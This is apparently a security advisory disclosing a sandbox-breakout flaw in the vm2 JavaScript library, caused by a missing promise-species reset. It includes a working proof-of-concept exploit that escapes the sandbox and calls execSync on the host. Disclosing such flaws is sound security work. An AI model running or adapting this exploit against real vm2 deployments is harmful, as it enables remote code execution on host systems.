summary: "vm2 is Vulnerable to Sandbox Breakout Through Promise Species\n### Summary\n\nVM2\
  \ suffers from a sandbox breakout vulnerability. This allows attackers to write code which\
  \ can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n###\
  \ Details\n\nThe `localPromise` constructor was changed to call `this.then(undefined, eater)`\
  \ to ensure a rejected promise is always used. However, this is missing a call to `resetPromiseSpecies`\
  \ to ensure that `this` has no special species. Since the species can be changed a custom\
  \ promise can be used to supply a custom reject method to the executor allowing to get a raw\
  \ host error and escape the sandbox.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\n\
  const vm = new VM();\nvm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d > 0) so(d-1);\n\
  \tconst e = new E();\n\te.stack;\n\tthrow e;\n}\nlet ex, ct;\nclass FakePromise extends Promise\
  \ {\n\tstatic get [Symbol.species](){return ct;}\n}\nfunction doCatch(f) {\n\tex=undefined;\n\
  \tconst p=Promise.withResolvers();\n\tct = function(e){e(f, v=>{ex=v;p.resolve();})};\n\t\
  new FakePromise(r=>r());\n\treturn p.promise;\n}\n(async function f(s) {\n\tlet min = s;\n\
  \tlet max = 100000;\n\twhile (min<max) {\n\t\tconst mid = (min+max)>>1;\n\t\tawait doCatch(()=>so(mid));\n\
  \t\tif (ex.name===\"RangeError\" && !(ex instanceof RangeError)) {\n\t\t\tex.constructor.constructor(\"\
  return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\
  \t\t}\n\t\tif (ex instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t\
  }\n\t}\n\tf(s+1);\n})(0);\n`);\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution\
  \ under the assumption that the attacker can run arbitrary code execution inside the context\
  \ of a vm2 sandbox."
